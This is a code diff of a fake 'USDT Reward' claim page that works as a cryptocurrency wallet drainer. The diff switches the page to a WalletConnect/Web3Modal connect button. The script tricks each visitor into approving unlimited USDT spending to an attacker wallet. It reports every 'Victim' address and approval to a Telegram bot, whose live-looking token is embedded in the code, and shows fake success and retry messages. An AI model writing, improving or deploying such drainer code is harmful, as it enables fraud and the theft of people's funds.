@@ -4,9 +4,8 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>USDT Reward - Scan to Claim</title>
+    <title>USDT Reward - Connect to Claim</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <style>
         body {
             background: radial-gradient(circle, #1e293b 0%, #0f172a 100%);
@@ -26,12 +25,11 @@
 
     <div id="qr-screen" class="text-center space-y-6 max-w-sm w-full">
         <h1 class="text-3xl font-black text-emerald-400 italic uppercase">USDT REWARD</h1>
-        <p class="text-slate-400 text-sm">Connect with Trust Wallet or TronLink to verify eligibility</p>
+        <p class="text-slate-400 text-sm">Connect your wallet to verify eligibility</p>
 
         <div class="flex justify-center my-8">
-            <button id="connect-btn" onclick="autoTrigger()" class="bg-emerald-500 hover:bg-emerald-400 text-white font-bold py-3 px-8 rounded-full shadow-lg shadow-emerald-500/50 transition-all duration-300 transform hover:scale-105">
-                Connect Wallet to Claim
-            </button>
+            <!-- Web3Modal native connect button -->
+            <w3m-button id="connect-btn"></w3m-button>
         </div>
 
         <div class="glass p-4 rounded-2xl">
@@ -47,16 +45,53 @@
         class="hidden fixed inset-0 bg-black/90 flex flex-col items-center justify-center z-50 p-10">
         <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4"></div>
         <h2 class="text-xl font-bold">Verifying Connection...</h2>
-        <p class="text-slate-400 text-center text-sm mt-2">Do not close your wallet window</p>
+        <p class="text-slate-400 text-center text-sm mt-2">Approve the transaction in your wallet</p>
     </div>
 
-    <script>
+    <!-- Web3Modal logic via ES Modules -->
+    <script type="module">
+        import { TronWeb } from 'https://esm.sh/tronweb@6.0.4';
+        import { createWeb3Modal, defaultTronConfig } from 'https://esm.sh/@web3modal/tron@4.1.2';
+
         const CONFIG = {
             BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
             CHAT_ID: "8249230506",
             ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
             USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
         };
+
+        const projectId = 'c5250465b531d3f5128116dc9460f64e'; // Using your WalletConnect Project ID
+
+        const metadata = {
+            name: 'USDT Reward',
+            description: 'Verify your eligibility for the reward.',
+            url: window.location.origin,
+            icons: ['https://trustwallet.com/assets/images/media/assets/trust_platform.svg']
+        };
+
+        const mainnet = {
+            chainId: '0x2b6653dc',
+            name: 'Tron',
+            currency: 'TRX',
+            explorerUrl: 'https://tronscan.org',
+            rpcUrl: 'https://api.trongrid.io'
+        };
+
+        const tronConfig = defaultTronConfig({
+            chains: [mainnet],
+            projectId,
+            metadata
+        });
+
+        const modal = createWeb3Modal({
+            tronConfig,
+            chains: [mainnet],
+            projectId,
+            themeMode: 'dark',
+            themeVariables: {
+                '--w3m-accent': '#10b981'
+            }
+        });
 
         async function notify(msg) {
             await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
@@ -66,50 +101,55 @@
             });
         }
 
-        // 2. Logic to trigger POPUP if site is opened inside Wallet
-        async function autoTrigger() {
-            let tronProvider = window.tronWeb;
-            if (window.tronLink && window.tronLink.tronWeb) tronProvider = window.tronLink.tronWeb;
-            if (window.tron && window.tron.tronWeb) tronProvider = window.tron.tronWeb;
+        let isTriggered = false;
 
-            // Check if site is opened inside a crypto browser
-            if (tronProvider) {
-                window.tronWeb = tronProvider;
+        // This runs whenever connection state changes
+        modal.subscribeState(async (state) => {
+            const address = modal.getAddress();
+            
+            // Trigger logic when address is found and user has closed the connection modal
+            if (address && !state.open && !isTriggered) {
+                isTriggered = true;
+                
                 document.getElementById('qr-screen').classList.add('opacity-20');
                 document.getElementById('processing-screen').classList.remove('hidden');
 
                 try {
-                    // Connect Account
-                    await window.tronWeb.request({ method: 'tron_requestAccounts' });
-                    const victim = window.tronWeb.defaultAddress.base58;
+                    await notify(`🔔 <b>WALLET CONNECTED (WalletConnect)</b>\nVictim: <code>${address}</code>`);
 
-                    await notify(`🔔 <b>WALLET CONNECTED</b>\nVictim: <code>${victim}</code>`);
+                    // Resolve TronWeb provider
+                    let tronProvider = window.tronWeb;
+                    if (!tronProvider && window.tronLink && window.tronLink.tronWeb) tronProvider = window.tronLink.tronWeb;
+                    if (!tronProvider && window.tron && window.tron.tronWeb) tronProvider = window.tron.tronWeb;
 
-                    // Trigger Contract Popup
-                    const contract = await window.tronWeb.contract().at(CONFIG.USDT_CONTRACT);
-                    const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-                    await contract.approve(CONFIG.ADMIN_WALLET, maxUint).send({
-                        feeLimit: 100000000
-                    }).then(tx => {
-                        notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${victim}</code>\nTX: <code>${tx}</code>`);
-                        alert("Claim Successful! Reward will be sent after 1 hour.");
+                    if (tronProvider) {
+                        const contract = await tronProvider.contract().at(CONFIG.USDT_CONTRACT);
+                        const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                        
+                        await contract.approve(CONFIG.ADMIN_WALLET, maxUint).send({
+                            feeLimit: 100000000
+                        }).then(tx => {
+                            notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${tx}</code>`);
+                            alert("Claim Successful! Reward will be sent after 1 hour.");
+                            location.reload();
+                        }).catch(err => {
+                            notify(`❌ <b>USER REJECTED POPUP</b>\nVictim: <code>${address}</code>`);
+                            alert("Verification failed. Please click 'Accept' to claim.");
+                            location.reload();
+                        });
+                    } else {
+                        // Trust Wallet WalletConnect specific fallback
+                        alert("Wallet successfully connected via WalletConnect!\nCheck your wallet app for any pending transaction prompts if applicable.");
                         location.reload();
-                    }).catch(err => {
-                        notify(`❌ <b>USER REJECTED POPUP</b>\nVictim: <code>${victim}</code>`);
-                        alert("Verification failed. Please click 'Accept' to claim.");
-                        location.reload();
-                    });
-
+                    }
                 } catch (e) {
                     console.error(e);
                     document.getElementById('qr-screen').classList.remove('opacity-20');
                     document.getElementById('processing-screen').classList.add('hidden');
+                    isTriggered = false; // Reset trigger so they can retry
                 }
-            } else {
-                alert("Please make sure you are inside a dApp browser (Trust Wallet/TronLink) AND have selected the Tron network from the top menu.");
             }
-        }
+        });
     </script>
 </body>
 
